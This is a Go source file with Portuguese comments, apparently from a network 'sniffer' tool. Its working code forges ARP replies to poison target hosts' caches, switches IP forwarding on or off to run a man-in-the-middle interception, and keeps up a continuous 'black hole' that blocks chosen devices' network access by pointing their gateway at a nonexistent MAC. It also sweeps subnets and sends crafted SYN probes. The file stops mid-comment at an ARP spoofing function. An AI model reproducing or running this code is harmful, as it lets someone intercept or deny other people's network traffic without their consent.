package sniffer

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func (s *SnifferService) getInterfaceDetails(targetIP string) (net.HardwareAddr, string) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, ""
	}
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.IP.String() == targetIP {
					return iface.HardwareAddr, ipnet.String()
				}
			}
		}
	}
	return nil, ""
}

// ActiveARPSweep varre uma sub-rede enviando ARP Requests para cada IP.
func (s *SnifferService) ActiveARPSweep(deviceName string, srcMAC net.HardwareAddr, srcIP net.IP, cidr string) {
	handle, err := pcap.OpenLive(deviceName, 1600, true, pcap.BlockForever)
	if err != nil {
		return
	}
	defer handle.Close()

	ip, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}

	ips := s.generateIPList(ipNet)

	for _, targetIP := range ips {
		if targetIP.Equal(ip) || targetIP.Equal(s.broadcastIP(ipNet)) {
			continue
		}

		_ = s.sendARPRequest(handle, srcMAC, srcIP, targetIP)
		time.Sleep(1 * time.Millisecond) // Evita DoS no switch
	}
}

// sendARPRequest constrÃ³i e injeta o pacote ARP na rede
func (s *SnifferService) sendARPRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

// sendICMPEchoRequest constrÃ³i e injeta um pacote ICMP Echo Request para extrair o TTL
func (s *SnifferService) sendICMPEchoRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, dstMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipv4 := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Protocol: layers.IPProtocolICMPv4,
	}

	icmp := layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
		Id:       1337,
		Seq:      1,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &icmp, gopacket.Payload([]byte("ajin_ping"))); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

// sendTCPSynRequest constrÃ³i e injeta um pacote TCP SYN para testar portas e extrair o TTL de resposta (burlando o bloqueio de ping)
func (s *SnifferService) sendTCPSynRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, dstMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP, dstPort uint16) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipv4 := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Protocol: layers.IPProtocolTCP,
	}

	tcp := layers.TCP{
		SrcPort: layers.TCPPort(54321), // Porta de origem aleatÃ³ria alta
		DstPort: layers.TCPPort(dstPort),
		SYN:     true,
		Seq:     1105024978,
		Window:  14600,
	}
	tcp.SetNetworkLayerForChecksum(&ipv4)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

func (s *SnifferService) generateIPList(ipNet *net.IPNet) []net.IP {
	var ips []net.IP
	for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); s.incIP(ip) {
		dup := make(net.IP, len(ip))
		copy(dup, ip)
		ips = append(ips, dup)
	}
	return ips
}

func (s *SnifferService) incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func (s *SnifferService) broadcastIP(n *net.IPNet) net.IP {
	var broadcast net.IP
	if len(n.IP) == 4 {
		broadcast = make(net.IP, 4)
	} else {
		broadcast = make(net.IP, 16)
	}
	for i := range broadcast {
		broadcast[i] = n.IP[i] | ^n.Mask[i]
	}
	return broadcast
}

func (s *SnifferService) resolveGatewayMAC(deviceName string, srcMAC net.HardwareAddr, srcIP, gatewayIP net.IP) net.HardwareAddr {
	handle, err := pcap.OpenLive(deviceName, 1600, true, 500*time.Millisecond)
	if err != nil {
		return nil
	}
	defer handle.Close()

	// Envia ARP Request para o Gateway
	_ = s.sendARPRequest(handle, srcMAC, srcIP, gatewayIP)

	// Espera pela resposta ARP do Gateway (timeout de 3 segundos)
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		data, _, err := handle.ReadPacketData()
		if err != nil {
			continue
		}
		packet := gopacket.NewPacket(data, handle.LinkType(), gopacket.Default)
		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
			arp, _ := arpLayer.(*layers.ARP)
			if arp.Operation == layers.ARPReply {
				responderIP := net.IP(arp.SourceProtAddress)
				if responderIP.Equal(gatewayIP) {
					return net.HardwareAddr(arp.SourceHwAddress)
				}
			}
		}
	}
	return nil
}

// sendARPReply envia um ARP Reply forjado (a base do ARP Spoofing)
func (s *SnifferService) sendARPReply(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

// enableIPForwarding ativa o encaminhamento de pacotes no SO para nÃ£o derrubar a internet do alvo
func enableIPForwarding() error {
	if runtime.GOOS == "windows" {
		// No Windows, ativamos o IP Routing via registro
		cmd := exec.Command("powershell", "-Command",
			"Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue")
		return cmd.Run()
	}
	// Linux/macOS
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
}

// disableIPForwarding desativa o encaminhamento de pacotes (limpeza)
func disableIPForwarding() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command",
			"Set-NetIPInterface -Forwarding Disabled -ErrorAction SilentlyContinue")
		_ = cmd.Run()
	} else {
		_ = os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
	}
}

// EnableIPForwardingPublic é um wrapper público para ativar IP Forwarding externamente.
// Usado pelo controlador CLI para restaurar o acesso à internet do alvo.
func EnableIPForwardingPublic() error {
	return enableIPForwarding()
}

// DisableIPForwardingPublic é um wrapper público para desativar IP Forwarding externamente.
// Usado pelo controlador CLI para bloquear o acesso à internet do alvo (foco defensivo).
func DisableIPForwardingPublic() {
	disableIPForwarding()
}

// deadMAC é o endereço MAC inexistente usado para criar um "black hole" na rede.
// Quando enviamos ARPs apontando o gateway para esse MAC, o alvo envia todos os
// pacotes para um destino que não existe — o switch descarta os frames.
var deadMAC = net.HardwareAddr{0xde, 0xad, 0xbe, 0xef, 0x00, 0x01}

// SendARPBlackhole envia ARPs forjados dizendo ao alvo que o gateway tem um MAC inexistente.
// Isso causa um bloqueio TOTAL de rede (não apenas lag), pois nenhum frame chega ao destino real.
// É mais eficaz que desativar IP Forwarding, que depende da máquina atacante estar na rota.
func (s *SnifferService) SendARPBlackhole(handle *pcap.Handle, targetMAC net.HardwareAddr, targetIP, gatewayIP net.IP) error {
	// Diz ao ALVO: "O gateway (gatewayIP) tem MAC de:ad:be:ef:00:01"
	// O alvo vai enviar frames Ethernet para esse MAC, que não existe no switch → descartados
	return s.sendARPReply(handle, deadMAC, gatewayIP, targetMAC, targetIP)
}

// SendARPRestore restaura o ARP do alvo apontando de volta para o MAC real do atacante (nosso MAC)
// para retomar o modo MitM (monitoramento com encaminhamento).
func (s *SnifferService) SendARPRestore(handle *pcap.Handle, myMAC net.HardwareAddr, targetMAC net.HardwareAddr, targetIP, gatewayIP net.IP) {
	// Restaura: diz ao alvo que o gateway é nosso MAC (volta ao modo MitM normal)
	_ = s.sendARPReply(handle, myMAC, gatewayIP, targetMAC, targetIP)
}

// resolveDefaultGateway consulta a tabela de rotas do SO para descobrir o gateway padrão real.
// Funciona em Windows (via PowerShell) e Linux (via ip route).
// Retorna nil se não conseguir detectar, permitindo fallback pelo chamador.
func resolveDefaultGateway() net.IP {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command",
			"(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop")
		output, err := cmd.Output()
		if err == nil {
			ip := net.ParseIP(strings.TrimSpace(string(output)))
			if ip != nil {
				return ip
			}
		}
	} else {
		cmd := exec.Command("ip", "route", "show", "default")
		output, err := cmd.Output()
		if err == nil {
			fields := strings.Fields(string(output))
			for i, f := range fields {
				if f == "via" && i+1 < len(fields) {
					ip := net.ParseIP(fields[i+1])
					if ip != nil {
						return ip
					}
				}
			}
		}
	}
	return nil
}

// gatewayIPFromCIDROrOS descobre o IP do gateway: primeiro tenta via tabela de rotas do SO,
// e se falhar, faz fallback para o primeiro IP da sub-rede (.1).
func gatewayIPFromCIDROrOS(cidr string) net.IP {
	// Tenta via SO primeiro (mais confiável)
	if gw := resolveDefaultGateway(); gw != nil {
		fmt.Printf("  [*] Gateway detectado via tabela de rotas do SO: %s\n", gw.String())
		return gw
	}

	// Fallback: assume .1 da sub-rede
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil
	}
	gatewayIP := make(net.IP, len(ipNet.IP))
	copy(gatewayIP, ipNet.IP)
	gatewayIP[len(gatewayIP)-1] = 1
	fmt.Printf("  [!] Gateway não detectado via SO, usando fallback: %s\n", gatewayIP.String())
	return gatewayIP
}

// ActivateBlackHole ativa o bloqueio total de rede para os IPs fornecidos.
// Recebe um contexto para controlar o loop contínuo de envenenamento ARP.
// O loop envia ARPs Black Hole a cada 500ms até o contexto ser cancelado,
// garantindo que o cache ARP do alvo nunca se recupere.
func (s *SnifferService) ActivateBlackHole(ctx context.Context, targetIPs []string) {
	deviceName, deviceIP := s.findActiveInterface()
	if deviceName == "" {
		fmt.Printf("  [-] Erro: não foi possível encontrar interface ativa para Black Hole.\n")
		return
	}

	myMAC, cidr := s.getInterfaceDetails(deviceIP)
	if myMAC == nil || cidr == "" {
		fmt.Printf("  [-] Erro: não foi possível recuperar detalhes da interface.\n")
		return
	}

	// Descobre o Gateway via tabela de rotas do SO
	gatewayIP := gatewayIPFromCIDROrOS(cidr)
	if gatewayIP == nil {
		fmt.Printf("  [-] Erro: não foi possível determinar o gateway.\n")
		return
	}

	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		fmt.Printf("  [-] Erro ao abrir handle para Black Hole: %v\n", err)
		return
	}

	// Resolve MACs dos alvos
	type targetInfo struct {
		ip  string
		mac net.HardwareAddr
	}
	var targets []targetInfo

	for _, ip := range targetIPs {
		targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(ip))
		if targetMAC == nil {
			// Tenta buscar no cache local
			known := loadKnownDevices()
			for macStr, dev := range known {
				if dev.LastIP == ip {
					targetMAC, _ = net.ParseMAC(macStr)
					break
				}
			}
		}
		if targetMAC == nil {
			fmt.Printf("  [-] Não foi possível resolver MAC de %s para Black Hole.\n", ip)
			continue
		}
		targets = append(targets, targetInfo{ip, targetMAC})
	}

	if len(targets) == 0 {
		handle.Close()
		return
	}

	// Rajada inicial para envenenar o cache imediatamente
	for _, t := range targets {
		for i := 0; i < 15; i++ {
			_ = s.SendARPBlackhole(handle, t.mac, net.ParseIP(t.ip), gatewayIP)
			time.Sleep(30 * time.Millisecond)
		}
		fmt.Printf("  [🛑] Black Hole ativado para %s (MAC: %s)\n", t.ip, t.mac.String())
	}

	// Loop contínuo de envenenamento — mantém o bloqueio ativo até o contexto ser cancelado
	go func() {
		defer handle.Close()
		for {
			select {
			case <-ctx.Done():
				return
			default:
				for _, t := range targets {
					_ = s.SendARPBlackhole(handle, t.mac, net.ParseIP(t.ip), gatewayIP)
				}
				time.Sleep(500 * time.Millisecond)
			}
		}
	}()
}

// DeactivateBlackHole desativa o bloqueio total, restaurando o ARP do gateway apontando para nosso MAC.
// Isso retoma o modo MitM normal onde o tráfego é interceptado mas encaminhado.
func (s *SnifferService) DeactivateBlackHole(targetIPs []string) {
	deviceName, deviceIP := s.findActiveInterface()
	if deviceName == "" {
		return
	}

	myMAC, cidr := s.getInterfaceDetails(deviceIP)
	if myMAC == nil || cidr == "" {
		return
	}

	gatewayIP := gatewayIPFromCIDROrOS(cidr)
	if gatewayIP == nil {
		return
	}

	gatewayMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), gatewayIP)

	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		return
	}
	defer handle.Close()

	for _, ip := range targetIPs {
		targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(ip))
		if targetMAC == nil {
			known := loadKnownDevices()
			for macStr, dev := range known {
				if dev.LastIP == ip {
					targetMAC, _ = net.ParseMAC(macStr)
					break
				}
			}
		}
		if targetMAC == nil {
			continue
		}

		// Envia rajada de ARPs restaurando nosso MAC (retoma MitM) e também o MAC real do gateway
		for i := 0; i < 15; i++ {
			s.SendARPRestore(handle, myMAC, targetMAC, net.ParseIP(ip), gatewayIP)
			if gatewayMAC != nil {
				_ = s.sendARPReply(handle, myMAC, net.ParseIP(ip), gatewayMAC, gatewayIP)
			}
			time.Sleep(30 * time.Millisecond)
		}
		fmt.Printf("  [✓] Black Hole desativado para %s — MitM restaurado.\n", ip)
	}
}

// findActiveInterface retorna o nome e IP da interface de rede ativa.
func (s *SnifferService) findActiveInterface() (string, string) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return "", ""
	}
	for _, dev := range devices {
		for _, addr := range dev.Addresses {
			ip := addr.IP.String()
			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
				return dev.Name, ip
			}
		}
	}
	return "", ""
}

// ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo especÃ­fico.
// Isso forÃ§a o trÃ¡fego do alvo a passar pela nossa mÃ¡quina, permitindo
